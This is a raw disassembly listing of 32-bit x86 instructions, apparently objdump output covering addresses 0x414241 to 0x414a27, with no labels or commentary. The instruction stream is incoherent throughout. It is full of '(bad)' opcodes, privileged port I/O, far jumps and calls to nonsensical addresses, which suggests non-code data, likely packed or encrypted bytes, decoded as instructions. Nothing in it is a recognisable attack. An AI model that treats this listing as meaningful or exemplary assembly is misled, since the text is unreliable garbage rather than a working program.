  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	mov    ecx,DWORD PTR [esi]
  41424e:	mov    eax,ds:0x61467d49
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	mov    DWORD PTR [edx],eax
  41425a:	leave  
  41425b:	mov    ah,0x3f
  41425d:	jae    0x414226
  41425f:	out    dx,al
  414260:	mov    esi,0x534d58c0
  414265:	xor    dh,BYTE PTR [esi+0x6f8f4d76]
  41426b:	inc    eax
  41426c:	daa    
  41426d:	not    BYTE PTR [ebx]
  41426f:	dec    ebx
  414270:	test   BYTE PTR [ecx-0x1f14bbbd],dl
  414276:	adc    eax,0xc20e77c3
  41427b:	jne    0x4142fc
  41427d:	stos   DWORD PTR es:[edi],eax
  41427e:	pushf  
  41427f:	push   edi
  414280:	stos   BYTE PTR es:[edi],al
  414281:	push   ds
  414282:	ja     0x41420a
  414284:	loope  0x414254
  414286:	inc    edx
  414287:	es je  0x414265
  41428a:	sub    BYTE PTR [ebx+0x65],bl
  41428d:	xor    ebp,edi
  41428f:	push   cs
  414290:	push   ecx
  414291:	sbb    eax,0xfa9ab931
  414296:	ins    BYTE PTR es:[edi],dx
  414297:	mov    edx,0x1eab8f4a
  41429c:	jl     0x4142ab
  41429e:	cld    
  41429f:	outs   dx,DWORD PTR ds:[esi]
  4142a0:	aad    0x7
  4142a2:	shl    BYTE PTR [edx],1
  4142a4:	ins    DWORD PTR es:[edi],dx
  4142a5:	and    eax,0xeee477b2
  4142aa:	cmp    BYTE PTR [esi-0x5c],cl
  4142ad:	(bad)  
  4142ae:	retf   0xf882
  4142b1:	sub    eax,0xb48250bb
  4142b6:	call   0x9cb881bf
  4142bb:	xchg   edx,eax
  4142bc:	mov    dh,BYTE PTR [edi]
  4142be:	and    eax,0x83255a8a
  4142c3:	shr    dl,0xe6
  4142c6:	pop    ebx
  4142c7:	cmp    ebx,DWORD PTR [esi-0x23]
  4142ca:	out    dx,eax
  4142cb:	int    0x64
  4142cd:	ja     0x4142cf
  4142cf:	mov    DWORD PTR [edx],ecx
  4142d1:	imul   BYTE PTR [edi-0x69]
  4142d4:	jmp    0x4142c2
  4142d6:	repnz enter 0x646d,0xc4
  4142db:	clc    
  4142dc:	sub    eax,0x7b53f82
  4142e1:	sub    esi,DWORD PTR [edx+edx*1-0x76]
  4142e5:	fld    TBYTE PTR [edi-0x2f]
  4142e8:	ds xchg edx,eax
  4142ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142eb:	iret   
  4142ec:	and    al,0x7a
  4142ee:	in     eax,dx
  4142ef:	or     DWORD PTR [esi],edx
  4142f1:	and    BYTE PTR [edx+0x3d],al
  4142f4:	sub    eax,0xa564ddd5
  4142f9:	sti    
  4142fa:	push   es
  4142fb:	jle    0x4142ae
  4142fd:	push   ss
  4142fe:	test   ebp,0xf996c2c8
  414304:	scas   eax,DWORD PTR es:[edi]
  414305:	les    esp,FWORD PTR [ecx-0x66]
  414308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414309:	xchg   edi,eax
  41430a:	popf   
  41430b:	push   eax
  41430c:	cld    
  41430d:	rcr    al,0x5a
  414310:	arpl   cx,bp
  414312:	sub    al,0xce
  414314:	cmp    esp,DWORD PTR [ecx]
  414316:	inc    esi
  414317:	ins    BYTE PTR es:[edi],dx
  414318:	int    0x3f
  41431a:	and    eax,0x3eae23c2
  41431f:	xor    BYTE PTR [ebx],dh
  414321:	mov    al,0x5a
  414323:	mov    ss,ecx
  414325:	push   edx
  414326:	push   ebx
  414327:	sbb    ebp,DWORD PTR [ebx+0x2d]
  41432a:	test   eax,0xbac4ba38
  41432f:	sbb    al,0xc0
  414331:	popa   
  414332:	mov    edx,0x49ed2fde
  414337:	lock jae 0x414326
  41433a:	sub    al,0xf3
  41433c:	sbb    esi,DWORD PTR [eax+0x16]
  41433f:	xor    DWORD PTR [ebp-0x62d3cfdc],ebx
  414345:	dec    esp
  414346:	pop    ecx
  414347:	ds push esp
  414349:	loopne 0x41438d
  41434b:	test   al,0x73
  41434d:	cmp    DWORD PTR [ecx-0xe329629],edi
  414353:	(bad)  
  414354:	lea    esi,[ebp-0x4fc74d6d]
  41435a:	js     0x4143b6
  41435c:	test   DWORD PTR [ecx],ecx
  41435e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41435f:	jle    0x4142e5
  414361:	and    al,0x91
  414363:	xor    esp,0xffffffb9
  414366:	ss mov ebp,0x23589cd5
  41436c:	int    0xfb
  41436e:	jmp    0x41431c
  414370:	bound  edi,QWORD PTR [ecx+0x9]
  414373:	outs   dx,DWORD PTR ds:[esi]
  414374:	pusha  
  414375:	lea    edi,[edi]
  414377:	fmul   QWORD PTR [ecx]
  414379:	out    0x46,eax
  41437b:	sub    eax,0x491f1631
  414380:	aaa    
  414381:	push   edi
  414382:	mov    ebp,0xb3cff5cb
  414387:	sti    
  414388:	or     esi,ebp
  41438a:	fmul   DWORD PTR [esi]
  41438c:	xchg   ecx,eax
  41438d:	loope  0x414387
  41438f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414390:	xchg   ecx,eax
  414391:	enter  0x4480,0x26
  414395:	pop    esi
  414396:	push   eax
  414397:	mov    WORD PTR [esi],?
  414399:	xor    eax,0x142df900
  41439e:	loop   0x414391
  4143a0:	pop    edi
  4143a1:	call   0xb477:0x67b66670
  4143a8:	outs   dx,BYTE PTR ds:[esi]
  4143a9:	mov    esi,DWORD PTR [ecx+0x4224215c]
  4143af:	imul   esi,esi,0x24
  4143b2:	loopne 0x41433b
  4143b4:	sbb    ch,BYTE PTR ds:0x9e2dcaba
  4143ba:	cmp    esi,ebx
  4143bc:	loope  0x414371
  4143be:	add    ecx,esi
  4143c0:	inc    edx
  4143c1:	inc    ecx
  4143c2:	mov    esi,0x1f129e3d
  4143c7:	sub    BYTE PTR es:[ebx+0xa],0x34
  4143cc:	push   0xffffffc7
  4143ce:	push   ebx
  4143cf:	fidivr WORD PTR [edi-0x50753a5e]
  4143d5:	das    
  4143d6:	inc    eax
  4143d7:	jno    0x414378
  4143d9:	jg     0x41441b
  4143db:	sub    al,BYTE PTR [eax]
  4143dd:	adc    edi,eax
  4143df:	fld    DWORD PTR [ecx]
  4143e1:	stos   BYTE PTR es:[edi],al
  4143e2:	jecxz  0x4143cd
  4143e4:	hlt    
  4143e5:	outs   dx,DWORD PTR ds:[esi]
  4143e6:	push   ss
  4143e7:	push   esi
  4143e8:	push   ds
  4143e9:	cmp    eax,0xa06296b2
  4143ee:	push   edx
  4143ef:	mov    ebp,0xab964b29
  4143f4:	jb     0x4143e9
  4143f6:	dec    ecx
  4143f7:	push   ecx
  4143f8:	ds das 
  4143fa:	ss push es
  4143fc:	out    0xd3,eax
  4143fe:	pop    ds
  4143ff:	scas   eax,DWORD PTR es:[edi]
  414400:	push   eax
  414401:	jns    0x41441e
  414403:	aad    0x96
  414405:	mov    ecx,0xe306e26f
  41440a:	fwait
  41440b:	enter  0xcca0,0x7b
  41440f:	cli    
  414410:	lahf   
  414411:	sub    DWORD PTR [ecx-0x1933bac6],ecx
  414417:	mov    ecx,0x9682f688
  41441c:	jmp    0x414470
  41441e:	div    DWORD PTR [esi-0x2a]
  414421:	stos   BYTE PTR es:[edi],al
  414422:	sar    edx,cl
  414424:	dec    ebp
  414425:	lahf   
  414426:	test   DWORD PTR [esi+0x19bfc57],ecx
  41442c:	push   0xc3b504e8
  414431:	xchg   ecx,eax
  414432:	in     eax,dx
  414433:	and    bh,BYTE PTR [ebx]
  414435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414436:	mov    eax,ds:0xe36413fd
  41443b:	mov    bl,0x86
  41443d:	loop   0x414459
  41443f:	or     ah,al
  414441:	std    
  414442:	xchg   al,ah
  414444:	mov    edi,0xfd85ded6
  414449:	stos   DWORD PTR es:[edi],eax
  41444a:	sub    al,0x2
  41444c:	jge    0x41441b
  41444e:	call   0x212b:0xba08126e
  414455:	sub    al,0xb4
  414457:	(bad)  
  414458:	xchg   ebp,eax
  414459:	or     BYTE PTR [ebx+esi*1-0x39d751c5],al
  414460:	mov    ds:0x77e02232,al
  414465:	ds jne 0x41446c
  414468:	sub    BYTE PTR [eax],ch
  41446a:	mov    ecx,gs
  41446c:	push   ss
  41446d:	daa    
  41446e:	push   ecx
  41446f:	in     eax,dx
  414470:	add    BYTE PTR [esi+0x511c612a],ah
  414476:	int    0x7c
  414478:	mov    esi,0x28865f24
  41447d:	cmp    al,0xf4
  41447f:	or     eax,0xb7784c9c
  414484:	xchg   edi,eax
  414485:	cld    
  414486:	xchg   ecx,eax
  414487:	(bad)  
  414488:	jmp    0x652c:0x4895c7ef
  41448f:	jno    0x4144d2
  414491:	xlat   BYTE PTR ds:[ebx]
  414492:	push   ecx
  414493:	fcomp  QWORD PTR [esi-0x7a]
  414496:	sbb    ebx,ecx
  414498:	mov    es,WORD PTR [ecx-0xbbc2d10]
  41449e:	adc    eax,0x3d031b7d
  4144a3:	arpl   WORD PTR [esi-0x6b],bx
  4144a6:	mul    DWORD PTR cs:[esi]
  4144a9:	in     eax,0x6d
  4144ab:	(bad)  
  4144ac:	adc    eax,0xb8895dd5
  4144b1:	leave  
  4144b2:	inc    edx
  4144b3:	je     0x4144fc
  4144b5:	lods   al,BYTE PTR ds:[esi]
  4144b6:	pop    ecx
  4144b7:	iret   
  4144b8:	shr    esi,1
  4144ba:	call   0x45dd317b
  4144bf:	mov    edi,?
  4144c1:	inc    edx
  4144c2:	fisttp QWORD PTR [esi+ebx*4]
  4144c5:	inc    esp
  4144c6:	std    
  4144c7:	mov    edx,0x25bfb40f
  4144cc:	mov    ebp,0xdfeadd49
  4144d1:	out    dx,eax
  4144d2:	pop    edi
  4144d3:	mov    dl,0xcd
  4144d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d6:	mov    ah,cl
  4144d8:	xlat   BYTE PTR ds:[ebx]
  4144d9:	test   eax,0xbe7c7642
  4144de:	out    0x7b,eax
  4144e0:	jo     0x4144f7
  4144e2:	add    BYTE PTR [edx-0x31],al
  4144e5:	xchg   edx,eax
  4144e6:	lahf   
  4144e7:	rol    BYTE PTR [ebx],1
  4144e9:	and    esp,DWORD PTR [edx+eiz*2]
  4144ec:	retf   
  4144ed:	inc    BYTE PTR [ecx-0x4d7683d]
  4144f3:	jp     0x41453a
  4144f5:	xchg   ecx,eax
  4144f6:	icebp  
  4144f7:	xchg   ebp,eax
  4144f8:	add    ecx,edi
  4144fa:	mov    al,ds:0xd8d93945
  4144ff:	jmp    0x471c5677
  414504:	and    eax,DWORD PTR [ecx]
  414506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414507:	mov    bl,0x86
  414509:	lods   al,BYTE PTR ds:[esi]
  41450a:	xchg   ebx,ebp
  41450c:	std    
  41450d:	push   ecx
  41450e:	jecxz  0x41453f
  414510:	shr    ebp,1
  414512:	call   DWORD PTR [esp+ebx*2+0x42adcdfb]
  414519:	xchg   esp,eax
  41451a:	push   ebp
  41451b:	mov    dh,0x5e
  41451d:	out    dx,eax
  41451e:	gs push esp
  414520:	adc    edx,DWORD PTR [edx+0x16c88489]
  414526:	fstp   DWORD PTR [ebp-0x2b495cc]
  41452c:	xor    BYTE PTR [ebx-0x4d9b3182],0x8d
  414533:	fst    DWORD PTR ds:0x4f6e29a2
  414539:	sub    al,0xd9
  41453b:	jbe    0x41454a
  41453d:	div    BYTE PTR [ecx]
  41453f:	outs   dx,DWORD PTR ds:[esi]
  414540:	rcr    DWORD PTR [ebp+0x787107bb],1
  414546:	jnp    0x414501
  414548:	fwait
  414549:	pop    ds
  41454a:	retf   0xf69b
  41454d:	lods   al,BYTE PTR ds:[esi]
  41454e:	inc    edi
  41454f:	pop    esi
  414550:	or     eax,DWORD PTR [ecx-0x4d41b6ac]
  414556:	call   0x74442edc
  41455b:	xor    edi,edi
  41455d:	pop    ecx
  41455e:	pop    edx
  41455f:	sbb    DWORD PTR [edi+ebx*1-0x289b36b4],esi
  414566:	dec    eax
  414567:	fst    DWORD PTR [ebx]
  414569:	jl     0x414502
  41456b:	sahf   
  41456c:	push   edx
  41456d:	jmp    0x696e:0xdb786d53
  414574:	sti    
  414575:	imul   ecx,ebp,0xffffffab
  414578:	xor    BYTE PTR [edi],ah
  41457a:	or     eax,0x6459033f
  41457f:	xchg   BYTE PTR [eax+edx*8+0x3d],dl
  414583:	xor    eax,0xb4987a6d
  414588:	mul    DWORD PTR [edi-0x32]
  41458b:	push   ebp
  41458c:	das    
  41458d:	pop    ebx
  41458e:	mov    ecx,cs
  414590:	test   DWORD PTR ds:0xe7d40f79,esp
  414596:	test   BYTE PTR [edi+0x6d76621],bl
  41459c:	(bad)  
  41459d:	daa    
  41459e:	sub    dh,BYTE PTR [edi-0x1c4bde74]
  4145a4:	call   0x51a45ec8
  4145a9:	add    al,0x7d
  4145ab:	enter  0x24e8,0x5e
  4145af:	mov    al,ds:0xd7c55458
  4145b4:	repnz mov dh,0xb4
  4145b7:	sbb    al,0xe7
  4145b9:	pminub mm1,QWORD PTR [ebx-0x21]
  4145bd:	dec    esi
  4145be:	(bad)  
  4145bf:	int3   
  4145c0:	adc    ebp,DWORD PTR [ebx]
  4145c2:	xchg   edx,eax
  4145c3:	adc    BYTE PTR [ebx+ebx*4],0xe9
  4145c7:	shl    edx,cl
  4145c9:	lods   eax,DWORD PTR ds:[esi]
  4145ca:	rcr    BYTE PTR [esi+0x1c],1
  4145cd:	fsubr  DWORD PTR [esi+0x2b811add]
  4145d3:	push   eax
  4145d4:	js     0x4145df
  4145d6:	or     BYTE PTR [ebp-0x604dded1],0x5f
  4145dd:	xchg   ecx,eax
  4145de:	data16 cld 
  4145e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145e1:	cmp    eax,0x6cf144a1
  4145e6:	in     al,dx
  4145e7:	dec    eax
  4145e8:	cmp    esi,esp
  4145ea:	mov    esi,0x8cac1d22
  4145ef:	push   ss
  4145f0:	loopne 0x41465b
  4145f2:	rcr    DWORD PTR [esi+edx*8-0x5efa704f],0xc7
  4145fa:	into   
  4145fb:	cmp    DWORD PTR [edi-0x9807f39],ebp
  414601:	xor    eax,0x3febd788
  414606:	test   dh,bh
  414608:	imul   eax,edx,0xfa5b7a98
  41460e:	out    dx,al
  41460f:	call   0x5cc94b16
  414614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414615:	repnz in al,0x2b
  414618:	data16 (bad) 
  41461a:	mov    bl,0x4b
  41461c:	jnp    0x4145bb
  41461e:	loopne 0x41464b
  414620:	sub    BYTE PTR [edx+ecx*4+0x6469fa99],bl
  414627:	imul   eax,DWORD PTR [esi-0x4aed6470],0x44
  41462e:	in     al,dx
  41462f:	clc    
  414630:	test   DWORD PTR [edi],0xa040acf9
  414636:	test   BYTE PTR [ecx],ch
  414638:	mov    ebp,0xc07434c4
  41463d:	daa    
  41463e:	lea    ebp,[ebp+0x5fb11c3a]
  414644:	scas   eax,DWORD PTR es:[edi]
  414645:	lea    eax,[ebp-0x32]
  414648:	popa   
  414649:	and    BYTE PTR [edx-0x38],ch
  41464c:	pop    ebp
  41464d:	fld    st(6)
  41464f:	mov    ch,0x31
  414651:	cmp    eax,0xc2843841
  414656:	and    BYTE PTR ds:0x7f9a2886,0xf0
  41465d:	int3   
  41465e:	rol    DWORD PTR ds:0x2fe59d3b,1
  414664:	bound  ebp,QWORD PTR [ebx-0x38502b02]
  41466a:	rcr    DWORD PTR [ebp-0x31],cl
  41466d:	loop   0x414614
  41466f:	iret   
  414670:	scas   eax,DWORD PTR es:[edi]
  414671:	sbb    eax,0x9e690381
  414676:	daa    
  414677:	mov    DWORD PTR [eax],eax
  414679:	xchg   ecx,eax
  41467a:	aaa    
  41467b:	mov    al,ds:0x3585e7f6
  414680:	out    dx,al
  414681:	int3   
  414682:	and    eax,0xa08902ba
  414687:	jmp    0x2cdf:0x4feebe82
  41468e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41468f:	data16 cmp BYTE PTR [eax-0x1fe31910],al
  414696:	nop
  414697:	(bad)  
  414698:	outs   dx,BYTE PTR ds:[esi]
  414699:	out    0xa7,al
  41469b:	or     bh,BYTE PTR [edi+0x51]
  41469e:	push   es
  41469f:	lods   al,BYTE PTR ds:[esi]
  4146a0:	push   0xcaf926af
  4146a5:	mov    edx,0xcd74d005
  4146aa:	cmp    bl,BYTE PTR [ebp+0x11408383]
  4146b0:	push   esp
  4146b1:	sbb    eax,0x5ec28ff5
  4146b6:	dec    eax
  4146b7:	pop    ds
  4146b8:	fisubr DWORD PTR [ebx]
  4146ba:	dec    ecx
  4146bb:	cld    
  4146bc:	push   ebp
  4146bd:	push   edx
  4146be:	pushf  
  4146bf:	push   cs
  4146c0:	cdq    
  4146c1:	adc    ebp,DWORD PTR [edi+0x1493e974]
  4146c7:	inc    edi
  4146c8:	shl    BYTE PTR [edi+0x52da027],1
  4146ce:	pop    esi
  4146cf:	sbb    BYTE PTR fs:[edx+eax*1],al
  4146d3:	add    al,0x0
  4146d5:	in     eax,0xc2
  4146d7:	dec    edx
  4146d8:	or     bl,ah
  4146da:	push   es
  4146db:	push   ecx
  4146dc:	jno    0x41473c
  4146de:	push   ds
  4146df:	jae    0x4146d6
  4146e1:	dec    edx
  4146e2:	mov    bl,0x61
  4146e4:	sahf   
  4146e5:	int    0x3b
  4146e7:	jecxz  0x41473b
  4146e9:	inc    ecx
  4146ea:	aad    0x98
  4146ec:	in     eax,dx
  4146ed:	jb     0x41476e
  4146ef:	sub    eax,0x32b1d893
  4146f4:	cs (bad) 
  4146f6:	xor    al,0x8c
  4146f8:	and    DWORD PTR [eax-0x1f48be24],edi
  4146fe:	aad    0xd0
  414700:	sub    ah,BYTE PTR [edi]
  414702:	push   ebp
  414703:	pop    es
  414704:	xchg   ecx,eax
  414705:	nop
  414706:	jp     0x414701
  414708:	outs   dx,BYTE PTR ds:[esi]
  414709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41470a:	or     al,ch
  41470c:	add    bh,BYTE PTR [ecx-0x2fe2eff7]
  414712:	mov    edi,0x676387e
  414717:	push   ss
  414718:	pop    ecx
  414719:	fdivr  st(4),st
  41471b:	out    dx,al
  41471c:	push   esp
  41471d:	aam    0xd6
  41471f:	mov    edx,0x45088fb4
  414724:	pop    edx
  414725:	add    BYTE PTR [ecx-0x66],al
  414728:	adc    ebx,DWORD PTR [ebp-0x2b42eca1]
  41472e:	and    BYTE PTR [ecx-0x41e2606],bl
  414734:	adc    ebx,ebp
  414736:	test   BYTE PTR [ecx],ch
  414738:	dec    edx
  414739:	inc    edx
  41473a:	adc    eax,ecx
  41473c:	jno    0x414708
  41473e:	std    
  41473f:	inc    ecx
  414740:	sbb    BYTE PTR [ecx-0x18],0xdc
  414744:	dec    edx
  414745:	inc    esp
  414746:	jl     0x414762
  414748:	mov    edi,0x727640da
  41474d:	push   eax
  41474e:	mov    ds:0xf9b82856,eax
  414753:	xchg   edx,eax
  414754:	mov    ds,eax
  414756:	sub    edi,ecx
  414758:	das    
  414759:	or     ebp,DWORD PTR [ecx+0x74]
  41475c:	inc    edx
  41475d:	aas    
  41475e:	inc    ebp
  41475f:	sbb    eax,0x3b006983
  414764:	retf   
  414765:	repz cmp eax,0x42348430
  41476b:	ds xor al,0x7
  41476e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476f:	inc    eax
  414770:	int    0xcb
  414772:	pop    esp
  414773:	xchg   ebx,eax
  414774:	ds inc edx
  414776:	push   esi
  414777:	sub    ah,BYTE PTR [ebp-0x4e75acbd]
  41477d:	(bad)  
  41477e:	jmp    0x4147ad
  414780:	popa   
  414781:	jno    0x414708
  414783:	test   eax,0x4811fedb
  414788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414789:	adc    eax,0x4275a916
  41478e:	xchg   DWORD PTR [esi-0x1611cbc1],ecx
  414794:	mov    eax,ds:0xa3ef533d
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	pop    ss
  41479b:	dec    DWORD PTR [eax-0x6f]
  41479e:	add    ebx,DWORD PTR [ebx]
  4147a0:	dec    ebp
  4147a1:	and    edi,DWORD PTR [edx+0x60bd099c]
  4147a7:	mov    cl,0xc3
  4147a9:	inc    ebx
  4147aa:	out    dx,al
  4147ab:	xchg   edi,eax
  4147ac:	sbb    eax,0xca0d341c
  4147b1:	imul   edi
  4147b3:	pand   mm2,mm2
  4147b6:	(bad)  
  4147b7:	aas    
  4147b8:	lods   al,BYTE PTR ds:[esi]
  4147b9:	add    ah,al
  4147bb:	and    ebx,DWORD PTR [ebp+0x20]
  4147be:	jle    0x414768
  4147c0:	lods   al,BYTE PTR ds:[esi]
  4147c1:	sub    eax,0xa7a083e0
  4147c6:	shl    DWORD PTR [esi-0x7a],0x6a
  4147ca:	popa   
  4147cb:	pop    esp
  4147cc:	das    
  4147cd:	add    BYTE PTR [ecx+0x1695ff83],ah
  4147d3:	lahf   
  4147d4:	cld    
  4147d5:	cmp    DWORD PTR [ebx],0xfe04ae93
  4147db:	jmp    0x2306:0x858e
  4147e1:	push   es
  4147e2:	stc    
  4147e3:	ffree  st(5)
  4147e5:	test   eax,0x1b080957
  4147ea:	jmp    0x2a3f663c
  4147ef:	mov    bh,0x2
  4147f1:	dec    esi
  4147f2:	aam    0xbf
  4147f4:	shl    BYTE PTR [edx],0xd2
  4147f7:	cmc    
  4147f8:	xor    eax,0xc3780109
  4147fd:	push   ebp
  4147fe:	clc    
  4147ff:	je     0x414808
  414801:	(bad)  
  414802:	mov    bl,0xce
  414804:	mov    ecx,0x7c77f5a3
  414809:	sbb    eax,0x5468f7a7
  41480e:	and    bh,al
  414810:	loope  0x414805
  414812:	push   edi
  414813:	ins    DWORD PTR es:[edi],dx
  414814:	popa   
  414815:	cdq    
  414816:	imul   edx,DWORD PTR [edi-0x1f],0xffffff86
  41481a:	imul   BYTE PTR [ebx]
  41481c:	push   esp
  41481d:	call   0x6249432e
  414822:	lods   eax,DWORD PTR ds:[esi]
  414823:	or     ah,BYTE PTR [ebp+edx*2-0x7559afad]
  41482a:	lds    ebx,FWORD PTR [ebx-0x2d]
  41482d:	popa   
  41482e:	(bad)  
  41482f:	mov    ah,0xd1
  414831:	pop    ecx
  414832:	out    dx,eax
  414833:	test   DWORD PTR [ecx+0x61],esi
  414836:	cs test eax,0x485d4b00
  41483c:	leave  
  41483d:	cmp    DWORD PTR [ecx+0x44],0x42
  414841:	enter  0x341f,0x9f
  414845:	fst    DWORD PTR [edi]
  414847:	ret    
  414848:	outs   dx,BYTE PTR ds:[esi]
  414849:	stos   BYTE PTR es:[edi],al
  41484a:	(bad)  
  41484b:	(bad)  
  41484c:	xor    dh,BYTE PTR [ebx+0x2f]
  41484f:	mov    ecx,0x71870be
  414854:	jne    0x4148be
  414856:	fiadd  DWORD PTR [edx]
  414858:	add    bh,BYTE PTR [edi]
  41485a:	jg     0x414838
  41485c:	aas    
  41485d:	mov    ecx,0x791ab075
  414862:	hlt    
  414863:	push   ss
  414864:	inc    edx
  414865:	hlt    
  414866:	mov    al,0xe1
  414868:	adc    edx,DWORD PTR [ecx+ebx*4+0x3]
  41486c:	inc    eax
  41486d:	clc    
  41486e:	push   ds
  41486f:	outs   dx,WORD PTR ds:[esi]
  414871:	ds xor edx,ebx
  414874:	stos   DWORD PTR es:[edi],eax
  414875:	cmp    al,0xb7
  414877:	sbb    eax,0x53349c3f
  41487c:	adc    BYTE PTR [ecx],bh
  41487e:	stos   BYTE PTR es:[edi],al
  41487f:	cmp    eax,0xae635e67
  414884:	mov    esi,0x8f923c1c
  414889:	mov    ecx,0xb93dc882
  41488e:	push   eax
  41488f:	ins    DWORD PTR es:[edi],dx
  414890:	lock dec esi
  414892:	stos   BYTE PTR es:[edi],al
  414893:	jp     0x4148b8
  414895:	or     al,0x60
  414897:	outs   dx,DWORD PTR ds:[esi]
  414898:	and    DWORD PTR cs:[eax],0x14
  41489c:	mov    ah,0x35
  41489e:	out    0x28,al
  4148a0:	sbb    eax,0x7620187a
  4148a5:	mov    al,ds:0xb4860c75
  4148aa:	sub    ebp,ebx
  4148ac:	pop    eax
  4148ad:	imul   eax,DWORD PTR [ecx-0x30b1e78],0xffffffa5
  4148b4:	(bad)  
  4148b5:	pop    es
  4148b6:	test   al,bh
  4148b8:	xchg   ch,al
  4148ba:	pushf  
  4148bb:	pop    edi
  4148bc:	int3   
  4148bd:	cs add eax,0x951e3db2
  4148c3:	test   al,0x71
  4148c5:	add    bl,BYTE PTR [edi-0x40]
  4148c8:	icebp  
  4148c9:	adc    BYTE PTR [ebx+0x46],bh
  4148cc:	retf   0xceb7
  4148cf:	les    esi,FWORD PTR [edx-0x51]
  4148d2:	pop    ss
  4148d3:	fld    st(0)
  4148d5:	pusha  
  4148d6:	sbb    eax,0x26cf8402
  4148db:	xchg   edx,eax
  4148dc:	add    eax,0x30132ed2
  4148e1:	iret   
  4148e2:	lods   eax,DWORD PTR ds:[esi]
  4148e3:	test   eax,0x2c829d8
  4148e8:	sti    
  4148e9:	inc    esp
  4148ea:	sbb    esp,DWORD PTR [edx-0x27eecf38]
  4148f0:	jne    0x414933
  4148f2:	sub    al,0x20
  4148f4:	fadd   st(7),st
  4148f6:	(bad)  
  4148f8:	mov    dh,0x9c
  4148fa:	and    DWORD PTR [ecx],0xfffffff2
  4148fd:	push   ds
  4148fe:	repnz push ebx
  414900:	mov    eax,ds:0x4241cd16
  414905:	in     al,0xb9
  414907:	push   edi
  414908:	mov    ecx,0xd8c52030
  41490d:	cmp    BYTE PTR [esi],bh
  41490f:	mov    eax,0x2bf07eb1
  414914:	sbb    BYTE PTR [edx],0xed
  414917:	aad    0x6e
  414919:	jmp    0x414957
  41491b:	call   0x76c2c113
  414920:	dec    esi
  414921:	pop    edx
  414922:	into   
  414923:	cdq    
  414924:	sub    ah,BYTE PTR [ebx-0x4e6014ca]
  41492a:	ins    DWORD PTR es:[edi],dx
  41492b:	cmp    al,0x4c
  41492d:	(bad)  
  41492e:	aad    0x7d
  414930:	and    esi,DWORD PTR [eax]
  414932:	loopne 0x41495f
  414934:	popa   
  414935:	frstor [edi+ebp*2-0x4b]
  414939:	mov    ds:0x59e3991a,al
  41493e:	aam    0x40
  414940:	adc    BYTE PTR [eax],0x75
  414943:	les    esp,FWORD PTR [edx+0x7d05e07d]
  414949:	in     al,0x5c
  41494b:	pushf  
  41494c:	repnz add bh,bh
  41494f:	xchg   edi,eax
  414950:	jecxz  0x4149ae
  414952:	cld    
  414953:	(bad)  
  414954:	jmp    0x414959
  414956:	lods   al,BYTE PTR ds:[esi]
  414957:	jg     0x414952
  414959:	cmp    ah,0x7f
  41495c:	loop   0x4149b1
  41495e:	aad    0xda
  414960:	retf   0x4003
  414963:	es dec ecx
  414965:	dec    edi
  414966:	push   es
  414967:	jecxz  0x414951
  414969:	pop    ss
  41496a:	sub    eax,0xdc9a5d2e
  41496f:	js     0x414900
  414971:	mov    ecx,0xff9972d9
  414976:	call   0x2eb3:0x25524b8a
  41497d:	in     eax,dx
  41497e:	mov    ds:0x44db5464,eax
  414983:	and    eax,0x73d2684d
  414988:	adc    BYTE PTR [edi],al
  41498a:	pop    es
  41498b:	xchg   esp,eax
  41498c:	xor    eax,0xdcc51104
  414991:	mov    ch,0x48
  414993:	sub    al,0x52
  414995:	push   ecx
  414996:	pushf  
  414997:	cmp    edx,DWORD PTR [esi]
  414999:	xchg   ebp,eax
  41499a:	or     edi,DWORD PTR [eax*2-0x3abf4ec9]
  4149a1:	ja     0x414996
  4149a3:	ret    
  4149a4:	cmc    
  4149a5:	les    ebx,FWORD PTR [ebp-0x69]
  4149a8:	sbb    ah,BYTE PTR [edx-0x27]
  4149ab:	leave  
  4149ac:	mov    edi,0xadbe91c6
  4149b1:	shl    BYTE PTR [esi+ebp*4-0x5e],0xdf
  4149b6:	stc    
  4149b7:	add    esi,DWORD PTR [esi]
  4149b9:	out    0x22,eax
  4149bb:	shl    DWORD PTR [eax-0x3195c1df],cl
  4149c1:	mov    ch,0x9d
  4149c3:	ret    0xce9
  4149c6:	outs   dx,DWORD PTR ds:[esi]
  4149c7:	cmp    eax,0x4eaf99ba
  4149cc:	fwait
  4149cd:	in     al,dx
  4149ce:	add    DWORD PTR [eax],esp
  4149d0:	and    dh,BYTE PTR [ebx+0x4d]
  4149d3:	pop    edx
  4149d4:	mov    edi,0x83e6b7fe
  4149d9:	push   0xd4a7ffbe
  4149de:	lock jmp 0xbbf3:0xf546ac16
  4149e6:	push   0x5a
  4149e8:	data16 mov BYTE PTR es:[esi],bl
  4149ec:	or     dl,BYTE PTR [ebx]
  4149ee:	leave  
  4149ef:	mov    ch,0xd4
  4149f1:	sub    BYTE PTR [ecx],dl
  4149f3:	adc    BYTE PTR [ebx-0x34],ch
  4149f6:	jmp    0x95d84c37
  4149fb:	and    DWORD PTR [ebx],ecx
  4149fd:	xor    eax,0xf6c716f
  414a02:	xor    al,0x29
  414a04:	aad    0x57
  414a06:	das    
  414a07:	sbb    al,0x86
  414a09:	hlt    
  414a0a:	int3   
  414a0b:	in     eax,0x75
  414a0d:	adc    BYTE PTR [edx],ah
  414a0f:	xchg   DWORD PTR [ebp-0xd51818a],ebx
  414a15:	call   0x24b6d8c4
  414a1a:	jmp    0x9ce6:0x10c86a62
  414a21:	push   0xffffffd5
  414a23:	addr16 clc 
  414a25:	mov    es,WORD PTR [edx]
  414a27:	sbb    BYTE PTR [eax-0x376a9b],0xba
